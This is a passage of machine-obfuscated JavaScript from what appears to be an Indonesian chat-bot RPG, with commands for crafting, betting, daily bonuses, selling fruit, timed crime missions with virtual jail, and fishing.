_0x1ce978[_0x240d04(0x1f1)](_0x476bfb,_0x240d04(0x538)+_0x240d04(0x4d7)+_0x3e6565+(_0x240d04(0x1007)+_0x240d04(0xdef))+_0x3e6565+('\x20pickaxe\x0a\x0a'+'*乂\x20Yang\x20Bi'+_0x240d04(0x2296)+_0x240d04(0x247d))+Object['keys'](_0x43f4f3)[_0x240d04(0x16e6)](_0x9a6c16=>'▧\x20'+_0xbfa56d(_0x9a6c16))['join']('\x0a'));const _0x30135b=Object[_0x240d04(0x1121)](_0x4c33c0)[_0x240d04(0x2119)](([_0x49ccec,_0x3a9155])=>(_0x338416[_0x49ccec]||0x0)>=_0x3a9155);if(!_0x30135b){const _0x42d61f=Object['entries'](_0x4c33c0)['filter'](([_0x2c0cfb,_0x5ee130])=>(_0x338416[_0x2c0cfb]||0x0)<_0x5ee130)['map'](([_0x296fda,_0x50e120])=>'•\x20'+(_0x50e120-(_0x338416[_0x296fda]||0x0))+'\x20'+_0xbfa56d(_0x296fda));return _0x1ce978[_0x240d04(0x45a)](_0x476bfb,_0x240d04(0x18c9)+_0x240d04(0x1c17)+'untuk\x20memb'+_0x240d04(0xfa0)+_0xbfa56d(_0x520cf1)+(_0x240d04(0xdde)+_0x240d04(0x1641))+_0x42d61f[_0x240d04(0x86e)]('\x0a'));}for(let [_0x30c673,_0x3056b8]of Object[_0x240d04(0x1121)](_0x4c33c0)){_0x1ce978['JOOqQ'](_0x240d04(0xd30),_0x240d04(0x3fa))?_0x1ce978[_0x240d04(0xfa3)](_0x283110,_0x1ce978[_0x240d04(0x273c)]):_0x338416[_0x30c673]-=_0x3056b8;}const _0x23dd54=_0x53b9e3[_0x520cf1]();for(let [_0x2de46b,_0xb3df7b]of Object[_0x240d04(0x1121)](_0x23dd54)){_0x338416[_0x2de46b]=(_0x338416[_0x2de46b]||0x0)+_0xb3df7b;}return await _0x961430(_0x29c338),_0x1ce978[_0x240d04(0x13a4)](_0x476bfb,_0x240d04(0x1014)+'embuat\x20*'+_0x1ce978[_0x240d04(0x1878)](_0xbfa56d,_0x520cf1)+'*!');}catch(_0x40d199){console[_0x240d04(0x15e)](_0x40d199),_0x1ce978[_0x240d04(0x1c18)](_0x476bfb,_0x240d04(0x54a)+'salahan\x20sa'+_0x240d04(0x1c1e)+'g.');}}break;case _0x240d04(0xae7):{const _0x3f32d2=(_0x350abf=0x0)=>{const _0x2061ea=_0x240d04;return _0x350abf=_0x1ce978['biMQn'](parseInt,_0x350abf),!_0x1ce978[_0x2061ea(0x2c2c)](isNaN,_0x350abf)&&_0x1ce978[_0x2061ea(0x1a20)](typeof _0x350abf,_0x2061ea(0x19b5));};try{const _0x586584=await _0x1ce978[_0x240d04(0x726)](_0x182219),_0x12e557=_0x586584[_0xb65b97]=_0x586584[_0xb65b97]||{'money':0x0,'chip':0x0};if(!_0x12e557||!_0x12e557['nama']||!_0x12e557[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x1e7d)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x12e557[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x4a0)](_0x476bfb,_0x1ce978['IYBbO']);const _0x16b1cc=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0x13d9bf=[_0x1ce978[_0x240d04(0x5bb)],_0x1ce978[_0x240d04(0x1303)]];if(!_0x13d9bf[_0x240d04(0x55c)](_0x16b1cc))return _0x476bfb(_0x240d04(0x1811)+'ak\x20valid!\x0a'+_0x240d04(0x1b40)+'\x20bisa\x20dipa'+_0x240d04(0xa49)+_0x13d9bf[_0x240d04(0x86e)](',\x20')+(_0x240d04(0xbdc)+_0x240d04(0x2d1d)+_0x240d04(0x10c5)));let _0x41a5f8=0x1;if(/all/i[_0x240d04(0x1dc7)](_0x483c03[0x1])){if(_0x1ce978[_0x240d04(0x27f1)](_0x1ce978[_0x240d04(0x571)],_0x1ce978['XkEYl']))return _0x1ce978[_0x240d04(0xf34)](_0x197495,_0x1ce978[_0x240d04(0x24a8)]);else _0x41a5f8=_0x12e557[_0x16b1cc];}else _0x1ce978[_0x240d04(0x9ef)](_0x3f32d2,_0x483c03[0x1])&&(_0x41a5f8=Math['max'](0x1,parseInt(_0x483c03[0x1])));if(_0x1ce978[_0x240d04(0x10fb)](_0x12e557[_0x16b1cc]||0x0,_0x41a5f8))return _0x1ce978[_0x240d04(0x2418)](_0x476bfb,'❌\x20'+_0x1ce978[_0x240d04(0x1dc)](_0x5bdf16,_0x16b1cc)+(_0x240d04(0x658)+_0x240d04(0xaf9)+_0x240d04(0x2d4f)+'\x20*')+(_0x12e557[_0x16b1cc]||0x0)+'*');const _0x4a6c49=_0x12e557[_0x16b1cc],_0x253524=Math[_0x240d04(0xf02)](_0x1ce978['ZPbUA'](Math[_0x240d04(0x24f1)](),0x5b)),_0x3b7c0d=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x26b)](Math[_0x240d04(0x24f1)](),0x47));let _0x450e6a='';if(_0x1ce978[_0x240d04(0xfa4)](_0x3b7c0d,_0x253524))_0x12e557[_0x16b1cc]+=_0x41a5f8,_0x450e6a='Kamu\x20*Mena'+'ng*!\x20🏆\x0aMen'+'dapatkan\x20*'+'+'+_0x41a5f8+'\x20'+_0x5bdf16(_0x16b1cc)+'*';else{if(_0x1ce978[_0x240d04(0x2147)](_0x253524,_0x3b7c0d))_0x1ce978[_0x240d04(0x2af3)](_0x240d04(0x273d),_0x1ce978['oStvv'])?(_0x12e557[_0x16b1cc]-=_0x41a5f8,_0x450e6a=_0x240d04(0x2388)+_0x240d04(0xe35)+'langan\x20*-'+_0x41a5f8+'\x20'+_0x1ce978['CnstT'](_0x5bdf16,_0x16b1cc)+'*'):_0x204c4e[_0x240d04(0x25f5)](_0x592aed=>{const _0x3e78a6=_0x240d04;_0x3342dd+='\x0a📥\x20*'+_0x592aed+'*\x0a',_0x50ea44[_0x592aed][_0x3e78a6(0x25f5)](_0x1027c4=>{_0x2f1d9f+='🔗\x20'+_0x1027c4+'\x0a';});});else{if(_0x1ce978[_0x240d04(0x15eb)](_0x1ce978[_0x240d04(0x2819)],_0x1ce978['OKzoR'])){const _0x4e2bd3=Math[_0x240d04(0xf02)](_0x41a5f8/1.5);_0x12e557[_0x16b1cc]+=_0x4e2bd3,_0x450e6a=_0x240d04(0x1569)+_0x240d04(0x1131)+_0x240d04(0xd9e)+_0x240d04(0x633)+_0x4e2bd3+'\x20'+_0x1ce978[_0x240d04(0x2ed)](_0x5bdf16,_0x16b1cc)+'*';}else return _0x137af2[_0x240d04(0x15e)](_0xf35db9),_0x1ce978['kdDqY'](_0x2a8729,_0x1ce978[_0x240d04(0x1995)]);}}return await _0x1ce978[_0x240d04(0x2bf1)](_0x961430,_0x586584),_0x476bfb((_0x240d04(0x1c16)+_0x240d04(0x2204)+'*\x0a\x0a|\x20*Play'+_0x240d04(0x1a08)+'nt*\x20|\x0a|\x20BO'+'T\x20🤖\x20\x20\x20|\x20'+_0x253524+('\x20|\x0a|\x20KAMU\x20'+_0x240d04(0x1480))+_0x3b7c0d+_0x240d04(0xe72)+_0x450e6a+'\x0a')[_0x240d04(0x2d6d)]());}catch(_0x536623){return console[_0x240d04(0x15e)](_0x536623),_0x1ce978[_0x240d04(0x2450)](_0x476bfb,_0x1ce978[_0x240d04(0x931)]);}function _0x5bdf16(_0x540fa0){const _0x1334ce=_0x240d04;if(_0x1ce978[_0x1334ce(0x2843)](_0x1ce978[_0x1334ce(0x22e1)],_0x1ce978[_0x1334ce(0x22e1)]))_0x2f970a=_0x1ce978[_0x1334ce(0x1fb2)](_0x535040,_0x5d504b);else return _0x1ce978[_0x1334ce(0x1ee)](_0x540fa0[_0x1334ce(0x211a)](0x0)[_0x1334ce(0xdd3)+'e'](),_0x540fa0[_0x1334ce(0x728)](0x1));}}break;case _0x1ce978['JkjJJ']:case _0x1ce978[_0x240d04(0x11f6)]:{const _0x7c8732=_0x4ad7af=>{const _0x4ad2ba=_0x240d04;let _0x3e5e57=Math['floor'](_0x1ce978[_0x4ad2ba(0x558)](_0x1ce978[_0x4ad2ba(0x1492)](_0x4ad7af,0x3e8),0x3c)),_0x37da46=Math[_0x4ad2ba(0xf02)](_0x1ce978['gaCKu'](_0x4ad7af,_0x1ce978[_0x4ad2ba(0x2c7a)](0x3e8,0x3c))%0x3c),_0x21b9bc=Math[_0x4ad2ba(0xf02)](_0x1ce978[_0x4ad2ba(0x185)](_0x1ce978[_0x4ad2ba(0xb97)](_0x4ad7af,_0x1ce978['lZzZV'](0x3e8*0x3c,0x3c)),0x18));return _0x21b9bc[_0x4ad2ba(0x2cb7)]()[_0x4ad2ba(0x1f96)](0x2,'0')+_0x4ad2ba(0x2a6c)+_0x37da46[_0x4ad2ba(0x2cb7)]()['padStart'](0x2,'0')+'\x20menit\x20'+_0x3e5e57[_0x4ad2ba(0x2cb7)]()[_0x4ad2ba(0x1f96)](0x2,'0')+_0x4ad2ba(0x20ee);};try{const _0x1e4dda=await _0x1ce978[_0x240d04(0x4be)](_0x182219),_0x1c783d=_0x1e4dda[_0xb65b97]=_0x1e4dda[_0xb65b97]||{'money':0x0,'lastbonus':0x0};if(!_0x1c783d||!_0x1c783d[_0x240d04(0x2eea)]||!_0x1c783d[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x2aad)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x1c783d[_0x240d04(0x2344)])return _0x1ce978['eavMr'](_0x476bfb,_0x240d04(0x14f0)+_0x240d04(0x9ad)+'ara\x20karena'+_0x240d04(0x2826)+_0x240d04(0x1fbc)+_0x240d04(0x1310)+'unakan\x20*be'+'bas*\x20untuk'+_0x240d04(0x2b19)+_0x240d04(0x7af)+'keluar\x20dar'+_0x240d04(0xe32));_0x1c783d[_0x240d04(0x26e0)]=_0x1c783d[_0x240d04(0x26e0)]||0x0;const _0x3be1c0=Date[_0x240d04(0x104e)](),_0x185e5e=0x5265c00,_0x1d50af=_0x1ce978['lpzJY'](_0x1c783d[_0x240d04(0x26e0)],_0x185e5e),_0x8aa9e5=_0x1ce978[_0x240d04(0x206a)](_0x1d50af,_0x3be1c0);if(_0x1ce978[_0x240d04(0x220a)](_0x8aa9e5,0x0))return _0x1ce978['IzlcI'](_0x476bfb,_0x240d04(0x23ff)+_0x240d04(0x6a9)+_0x240d04(0x143c)+_0x240d04(0x218c)+_0x240d04(0x25ec)+_0x7c8732(_0x8aa9e5)+'*\x20lagi.');const _0x1cc325=Math[_0x240d04(0xf02)](_0x1ce978['tzpEM'](Math['random'](),0x2710));return _0x1c783d['money']+=_0x1cc325,_0x1c783d[_0x240d04(0x26e0)]=_0x3be1c0,await _0x961430(_0x1e4dda),_0x476bfb('🎉\x20*BONUS\x20H'+_0x240d04(0x1a2b)+_0x240d04(0x11e1)+_0x240d04(0x26d0)+_0x240d04(0x20d6)+'\x20'+_0x1cc325['toLocaleSt'+_0x240d04(0x1743)]()+_0x240d04(0x1354));}catch(_0xa4ce7b){return console[_0x240d04(0x15e)](_0xa4ce7b),_0x1ce978['jeFjN'](_0x476bfb,'Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0x1f03)+_0x240d04(0x2bba));}}break;case _0x1ce978[_0x240d04(0x2d08)]:{try{const _0x1a8c58=await _0x1ce978['uejKo'](_0x182219),_0x2f6e05=_0x1a8c58[_0xb65b97]=_0x1a8c58[_0xb65b97]||{'pisang':0x0,'anggur':0x0,'mangga':0x0,'jeruk':0x0,'apel':0x0,'money':0x0};if(!_0x2f6e05||!_0x2f6e05[_0x240d04(0x2eea)]||!_0x2f6e05[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);if(_0x2f6e05[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x2851)](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);if(_0x1ce978[_0x240d04(0x2d55)]((_0x483c03[0x0]||'')['toLowerCas'+'e'](),'sell')){if(_0x240d04(0x2e8)===_0x1ce978[_0x240d04(0x8f2)]){const _0x5ee877=0x3e8,_0x36a0e3=[_0x1ce978[_0x240d04(0x2dfa)],'anggur',_0x1ce978['ZlHGx'],_0x1ce978[_0x240d04(0xdf1)],_0x1ce978[_0x240d04(0x219d)]];let _0x20fa69=0x0,_0x541603=_0x240d04(0x24e0)+_0x240d04(0x2a01)+_0x240d04(0xb62);for(let _0x52a078 of _0x36a0e3){let _0x4e0584=_0x2f6e05[_0x52a078]||0x0;_0x1ce978[_0x240d04(0x63c)](_0x4e0584,0x0)&&(_0x20fa69+=_0x1ce978[_0x240d04(0x29d1)](_0x4e0584,_0x5ee877),_0x541603+='•\x20'+_0x4e0584+'\x20'+_0x1ce978[_0x240d04(0x199a)](_0x37b075,_0x52a078)+_0x240d04(0x993)+(_0x4e0584*_0x5ee877)[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'\x0a',_0x2f6e05[_0x52a078]=0x0);}if(_0x1ce978[_0x240d04(0x2634)](_0x20fa69,0x0)){if(_0x1ce978['YwSmx'](_0x1ce978[_0x240d04(0x17d0)],_0x1ce978[_0x240d04(0x612)]))return _0x1ce978[_0x240d04(0xa22)](_0x476bfb,_0x1ce978[_0x240d04(0x121e)]);else _0x37055d[_0x4f59e2]&&(_0x1ce978[_0x240d04(0x165b)](_0x73d223,_0x240d04(0xb17)+'bis!\x0aJawab'+'annya\x20adal'+_0x240d04(0x550)+_0x27fea8[_0x240d04(0x17dd)]+'*'),delete _0x41e592[_0x4d0e51]);}return _0x2f6e05[_0x240d04(0xd24)]+=_0x20fa69,await _0x1ce978[_0x240d04(0x29f3)](_0x961430,_0x1a8c58),_0x476bfb(_0x541603+('\x0aTotal:\x20*R'+'p\x20')+_0x20fa69['toLocaleSt'+_0x240d04(0x1743)]()+('*\x20diterima'+'.'));}else _0x1ce978[_0x240d04(0x18cd)](_0x95b373,_0x339393,_0x30dbfc[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);}else{const _0x462da7=_0x1ce978[_0x240d04(0xf9f)](_0x1ce978['cbLva'](_0x1ce978[_0x240d04(0x5e6)](_0x1ce978['LEbtJ'](_0x1ce978[_0x240d04(0x2ad2)](_0x1ce978[_0x240d04(0xe5d)](_0x240d04(0x244e)+_0x240d04(0x1b3b)+'\x0a\x0a',_0x240d04(0x1afe)+(_0x2f6e05[_0x240d04(0x1a7c)]||0x0)+'\x0a'),'🍇\x20Anggur:\x20'+(_0x2f6e05[_0x240d04(0x2101)]||0x0)+'\x0a'),_0x240d04(0x2e87)+(_0x2f6e05['mangga']||0x0)+'\x0a'),_0x240d04(0x822)+(_0x2f6e05[_0x240d04(0x196b)]||0x0)+'\x0a'),'🍎\x20Apel:\x20'+(_0x2f6e05[_0x240d04(0x1f22)]||0x0)+'\x0a\x0a'),_0x240d04(0x2682)+_0x240d04(0xc0a)+'untuk\x20menj'+_0x240d04(0x7fd)+_0x240d04(0x2712));return _0x1ce978[_0x240d04(0x2e6f)](_0x476bfb,_0x462da7);}function _0x37b075(_0x282167){const _0x540ab8=_0x240d04;return _0x1ce978[_0x540ab8(0x288e)](_0x282167['charAt'](0x0)['toUpperCas'+'e'](),_0x282167[_0x540ab8(0x728)](0x1));}}catch(_0x12e832){if(_0x1ce978[_0x240d04(0x1935)](_0x1ce978[_0x240d04(0x1609)],_0x1ce978[_0x240d04(0xfea)]))console[_0x240d04(0x15e)](_0x12e832),_0x1ce978[_0x240d04(0xe7b)](_0x476bfb,_0x1ce978[_0x240d04(0xcd1)]);else return _0x1ce978['gbyqu'](_0x4bd60f,_0x1ce978[_0x240d04(0x6b7)]);}}break;case _0x1ce978['lhFcR']:case _0x1ce978[_0x240d04(0xb3f)]:{const _0x14144a=_0x96eaf6=>{const _0x5209c9=_0x240d04,_0xd593c5={'hAQTR':function(_0x1c986b,_0x1521da){return _0x1ce978['pbxwu'](_0x1c986b,_0x1521da);},'PeMkV':function(_0x5e221b,_0x2a1291){const _0x1d0a14=a0_0x1014;return _0x1ce978[_0x1d0a14(0x2a0e)](_0x5e221b,_0x2a1291);},'WUKus':_0x5209c9(0x2720)+_0x5209c9(0x2653)+'o\x20profil:\x20'};if(_0x1ce978['ikIPi'](_0x1ce978['UQriK'],_0x1ce978['UQriK'])){let _0x5d3159=Math['floor'](_0x1ce978[_0x5209c9(0x106)](_0x96eaf6,0x36ee80)),_0x41c2dd=_0x1ce978[_0x5209c9(0xf46)](Math[_0x5209c9(0xf02)](_0x1ce978['dpDDd'](_0x96eaf6,0xea60)),0x3c),_0x1a5cb3=_0x1ce978[_0x5209c9(0x135)](Math[_0x5209c9(0xf02)](_0x96eaf6/0x3e8),0x3c);return[_0x5d3159,_0x41c2dd,_0x1a5cb3]['map'](_0x4f2f18=>_0x4f2f18['toString']()['padStart'](0x2,0x0))['join'](':');}else _0xd593c5[_0x5209c9(0xcc3)](_0x20f7a1,_0xd593c5[_0x5209c9(0x1e59)](_0xd593c5[_0x5209c9(0x92e)],_0x5f3448[_0x5209c9(0x960)]));};try{const _0x579922=await _0x1ce978[_0x240d04(0x22fc)](_0x182219),_0x128e7f=_0x579922[_0xb65b97]=_0x579922[_0xb65b97]||{'money':0x0,'exp':0x0,'ojekk':0x0,'warn':0x0,'jail':![],'lastmisi':0x0};if(!_0x128e7f||!_0x128e7f[_0x240d04(0x2eea)]||!_0x128e7f['umur'])return _0x1ce978[_0x240d04(0x211)](_0x1ce978[_0x240d04(0x1a53)],_0x240d04(0x9c1))?_0x1ce978[_0x240d04(0x67a)](_0x476bfb,_0x1ce978['KdBjs']):_0x1ce978[_0x240d04(0xfb4)](_0x216ba1,_0x1ce978[_0x240d04(0x17c4)]);if(_0x128e7f[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x10e0)](_0x476bfb,'⛓️\x20Kamu\x20sed'+_0x240d04(0x2324)+_0x240d04(0x166e)+_0x240d04(0x2826)+_0x240d04(0x1fbc)+_0x240d04(0x1310)+_0x240d04(0x260)+_0x240d04(0x1c31)+_0x240d04(0x2b19)+_0x240d04(0x7af)+_0x240d04(0x2e65)+_0x240d04(0xe32));const _0x418ef1=Date[_0x240d04(0x104e)](),_0x300b8a=0x36ee80,_0x48e8a1=_0x1ce978[_0x240d04(0x1afd)](_0x1ce978[_0x240d04(0x1aea)](_0x128e7f['lastmisi'],_0x300b8a),_0x418ef1);if(_0x1ce978[_0x240d04(0x2b89)](_0x48e8a1,0x0))return _0x1ce978['JinaF'](_0x476bfb,_0x240d04(0x1eeb)+_0x1ce978[_0x240d04(0x1e4b)](_0x14144a,_0x48e8a1)+(_0x240d04(0x20ef)+_0x240d04(0x13b8)+_0x240d04(0x1b51)+'\x20lagi.'));const _0x4f4e7e=_0x1ce978[_0x240d04(0x105c)](Math[_0x240d04(0xf02)](Math['random']()*0xa),0x186a0),_0x2fae40=_0x1ce978[_0x240d04(0x2627)](Math['floor'](_0x1ce978[_0x240d04(0x2a61)](Math['random'](),0xa)),0x3e8);_0x128e7f[_0x240d04(0xd24)]+=_0x4f4e7e,_0x128e7f[_0x240d04(0x21ac)]+=_0x2fae40,_0x128e7f[_0x240d04(0x1351)]+=0x1,_0x128e7f[_0x240d04(0x1e6d)]+=0x1,_0x128e7f[_0x240d04(0x25c4)]=_0x418ef1,_0x1ce978['nzasa'](_0x128e7f['warn'],0x3)&&(_0x128e7f[_0x240d04(0x2344)]=!![]),await _0x1ce978[_0x240d04(0x26ad)](_0x961430,_0x579922),global['misi']=global[_0x240d04(0xbe8)]||{},global[_0x240d04(0xbe8)][_0xb65b97]=[_0x1ce978[_0x240d04(0x2924)]],_0x1ce978[_0x240d04(0x227f)](setTimeout,()=>delete global[_0x240d04(0xbe8)][_0xb65b97],0x6d60),_0x1ce978[_0x240d04(0x11b7)](setTimeout,()=>{const _0x3f63e9=_0x240d04,_0xfa1162={'ijVpy':_0x1ce978[_0x3f63e9(0xe65)]};_0x1ce978[_0x3f63e9(0x1559)](_0x3f63e9(0x2013),_0x1ce978[_0x3f63e9(0x172b)])?_0x1ce978[_0x3f63e9(0x16da)](_0x476bfb,_0x1ce978['WjYCs'](_0x1ce978[_0x3f63e9(0x154e)](_0x3f63e9(0x242a)+_0x3f63e9(0x6d7)+(_0x19007e||_0x1ce978[_0x3f63e9(0x2b08)])+_0x3f63e9(0x1e90)+(_0x3f63e9(0x5ed)+'Rp\x20'+_0x4f4e7e[_0x3f63e9(0x17bf)+_0x3f63e9(0x1743)]()+'\x0a')+(_0x3f63e9(0x1e5b)+_0x2fae40+'\x0a')+(_0x3f63e9(0x2160)+_0x3f63e9(0x13a9)+_0x3f63e9(0x89f)+_0x128e7f[_0x3f63e9(0x1351)]+')\x0a'),_0x3f63e9(0x55e)+_0x3f63e9(0x1227)+'\x0a'),_0x3f63e9(0x1dc2)+_0x3f63e9(0x1dc3)+_0x128e7f[_0x3f63e9(0x1e6d)])):_0xe6081e(_0x151c65,_0x59c3ca[_0x3f63e9(0x2b45)],_0xfa1162['ijVpy']);},0x6978),_0x1ce978['zPbnQ'](setTimeout,()=>_0x476bfb(_0x240d04(0x10f2)+'l\x20barang\x20d'+_0x240d04(0x2180)+_0x240d04(0x29fe)),0x61a8),setTimeout(()=>_0x476bfb(_0x240d04(0x1e38)+'eninggal..'+'.'),0x4e20),_0x1ce978[_0x240d04(0x11fe)](setTimeout,()=>_0x476bfb('⚔️\x20Menusuk\x20'+_0x240d04(0x2aa0)+'et...'),0x3a98),_0x1ce978[_0x240d04(0x18da)](setTimeout,()=>_0x476bfb(_0x240d04(0x2b12)+_0x240d04(0xe36)+'.'),0x2710),setTimeout(()=>_0x476bfb(_0x240d04(0x2e23)+_0x240d04(0xaad)+_0x240d04(0x28dd)),0x0),_0x128e7f[_0x240d04(0x2344)]&&setTimeout(()=>_0x476bfb('⛓️\x20Kamu\x20tel'+_0x240d04(0x2074)+'RA\x20karena\x20'+'terlalu\x20ba'+_0x240d04(0x1f97)+_0x240d04(0xf3f)+_0x240d04(0x1f75)+_0x240d04(0x2431)+_0x240d04(0x2d8b)),0x7530);}catch(_0x1cee00){console[_0x240d04(0x15e)](_0x1cee00),_0x1ce978[_0x240d04(0x2751)](_0x476bfb,_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x1d8e)+_0x240d04(0xa9a)+_0x240d04(0x1b51)+'.');}}break;case _0x1ce978[_0x240d04(0x1774)]:{try{const _0x3b8c6f=await _0x1ce978[_0x240d04(0x2407)](_0x182219),_0x343f41=_0x3b8c6f[_0xb65b97]=_0x3b8c6f[_0xb65b97]||{'jail':![],'warn':0x0,'money':0x0};if(!_0x343f41||!_0x343f41[_0x240d04(0x2eea)]||!_0x343f41['umur'])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);if(!_0x343f41[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x20c6)](_0x476bfb,_0x1ce978[_0x240d04(0xbcf)]);const _0x4a3269=0xf4240;if(_0x1ce978[_0x240d04(0x153a)](_0x343f41[_0x240d04(0xd24)]||0x0,_0x4a3269)){if(_0x1ce978['RBRNH']===_0x1ce978[_0x240d04(0x11f4)])return _0x1ce978[_0x240d04(0x176f)](_0x476bfb,'❌\x20Uang\x20kam'+_0x240d04(0x47b)+'kup\x20untuk\x20'+_0x240d04(0xfb7)+_0x240d04(0x12cd)+_0x240d04(0x1db4)+'\x20'+_0x4a3269['toLocaleSt'+_0x240d04(0x1743)]());else{_0x2f3ccc='-';let _0x5f44f0=new _0x41f54c(new _0x5a0062()+0x36ee80),_0x42fd50=_0x5f44f0[_0x240d04(0x2b98)+_0x240d04(0x20b7)]('en',{'weekday':_0x1ce978['mpYuI']}),_0x57a61e=[_0x1ce978['LdSTt'],_0x1ce978[_0x240d04(0xf31)],_0x1ce978[_0x240d04(0x1e8f)],_0x240d04(0x1090),_0x1ce978[_0x240d04(0x917)]][_0x1ce978[_0x240d04(0x1bde)](_0x236c84['floor'](_0x1ce978[_0x240d04(0x23e0)](_0x5f44f0,0x50ae4c0)),0x5)],_0x351aca=_0x5f44f0[_0x240d04(0x2b98)+_0x240d04(0x20b7)]('en',{'day':_0x1ce978[_0x240d04(0x18dd)],'month':_0x240d04(0x2047),'year':_0x1ce978[_0x240d04(0x18dd)]}),_0x328cec=_0xc0411b[_0x240d04(0x1619)+_0x240d04(0x691)](_0x1ce978['OCsGr']('en',_0x1ce978[_0x240d04(0x181e)]),{'day':_0x1ce978['UHgMT'],'month':_0x1ce978[_0x240d04(0x2ef7)],'year':_0x1ce978[_0x240d04(0x18dd)]})[_0x240d04(0x2579)](_0x5f44f0);_0x3ed9a8[_0x240d04(0x226e)](_0x2aeaa0,_0x42bfdc,_0x1cd0ea,_0x26df26,_0x33c039,_0x38820f,_0x3bd970,_0x1712e8,_0x98ed92,_0x299a65,_0x42fd50,_0x351aca,_0x328cec,_0x4c2a0e,_0x21eb2b,_0x17f3f2[_0x240d04(0x960)][_0x240d04(0x19ed)]['id'][_0x240d04(0x2cb7)]());}}return _0x343f41[_0x240d04(0xd24)]-=_0x4a3269,_0x343f41[_0x240d04(0x2344)]=![],_0x343f41[_0x240d04(0x1351)]=0x0,await _0x961430(_0x3b8c6f),_0x1ce978[_0x240d04(0x1745)](_0x476bfb,_0x240d04(0x163f)+'ah\x20membaya'+'r\x20denda\x20Rp'+'\x20'+_0x4a3269[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+('\x20dan\x20BEBAS'+_0x240d04(0x2bef)+_0x240d04(0x32a)));}catch(_0x3e4c72){console[_0x240d04(0x15e)](_0x3e4c72),_0x1ce978[_0x240d04(0x6b1)](_0x476bfb,_0x1ce978['xsMsO']);}}break;case _0x1ce978[_0x240d04(0x1eb7)]:{const _0x274d20=_0x34fa70=>{const _0x13ac99=_0x240d04,_0x1c3997={'OCWaI':function(_0x34a94b,_0x3ec4df){return _0x1ce978['aRmCN'](_0x34a94b,_0x3ec4df);}};if(_0x1ce978[_0x13ac99(0x273e)]===_0x1ce978['fNNQO'])return _0x1c3997['OCWaI'](_0x163b96,_0x13ac99(0x2d2e)+_0x13ac99(0xae4)+_0x13ac99(0x2a36)+_0x13ac99(0x1fc9)+'k\x20mencoba\x20'+_0x13ac99(0x215e));else{let _0x33e210=Math['floor'](_0x34fa70/0x36ee80),_0x34c8b4=Math[_0x13ac99(0xf02)](_0x1ce978[_0x13ac99(0x2948)](_0x34fa70,0xea60))%0x3c,_0x232ff3=Math[_0x13ac99(0xf02)](_0x1ce978[_0x13ac99(0x14fb)](_0x34fa70,0x3e8))%0x3c;return[_0x33e210,_0x34c8b4,_0x232ff3][_0x13ac99(0x16e6)](_0xded0cc=>_0xded0cc[_0x13ac99(0x2cb7)]()[_0x13ac99(0x1f96)](0x2,0x0))['join'](':');}};try{const _0x33877d=await _0x1ce978[_0x240d04(0x233f)](_0x182219),_0x36eb6a=_0x33877d[_0xb65b97]=_0x33877d[_0xb65b97]||{'fishingrod':0x0,'fishingroddurability':0x0,'umpan':0x0,'lastmisi':0x0,'kepiting':0x0,'lobster':0x0,'udang':0x0,'cumi':0x0,'gurita':0x0,'buntal':0x0,'dory':0x0,'orca':0x0,'lumba':0x0,'paus':0x0,'hiu':0x0};if(!_0x36eb6a||!_0x36eb6a[_0x240d04(0x2eea)]||!_0x36eb6a[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0xd46)](_0x476bfb,_0x1ce978['KdBjs']);if(_0x36eb6a[_0x240d04(0x2344)])return _0x476bfb(_0x1ce978[_0x240d04(0x2bc6)]);if(_0x1ce978[_0x240d04(0x29cc)](_0x36eb6a[_0x240d04(0x22db)],0x0))return _0x1ce978[_0x240d04(0x1173)](_0x476bfb,_0x1ce978['DQXzU']);if(_0x36eb6a[_0x240d04(0x5bd)]<=0x0||_0x1ce978[_0x240d04(0x2295)](_0x36eb6a[_0x240d04(0x5bd)+'durability'],0x0))return _0x1ce978['avqRg'](_0x476bfb,_0x240d04(0x1e4d)+_0x240d04(0x2446)+'grod\x20🎣*\x20ya'+_0x240d04(0xe11)+_0x240d04(0x1d16)+_0x240d04(0xc41)+'!');const _0x3090e4=Date['now'](),_0x1872a2=0x36ee80,_0x5ecfda=_0x1ce978[_0x240d04(0x5d4)](_0x36eb6a[_0x240d04(0x25c4)]+_0x1872a2,_0x3090e4);if(_0x1ce978[_0x240d04(0xff1)](_0x5ecfda,0x0))return _0x476bfb(_0x240d04(0x246a)+_0x240d04(0x1770)+_0x1ce978[_0x240d04(0x1bcd)](_0x274d20,_0x5ecfda)+(_0x240d04(0x15cf)+_0x240d04(0x10ee)+'mbali.'));global['misi']=global['misi']||{};if(global[_0x240d04(0xbe8)][_0xb65b97])return _0x1ce978[_0x240d04(0x18ab)](_0x476bfb,_0x240d04(0xb86)+_0x240d04(0xc3f)+'isi:\x20*'+global['misi'][_0xb65b97][0x0]+'*');const 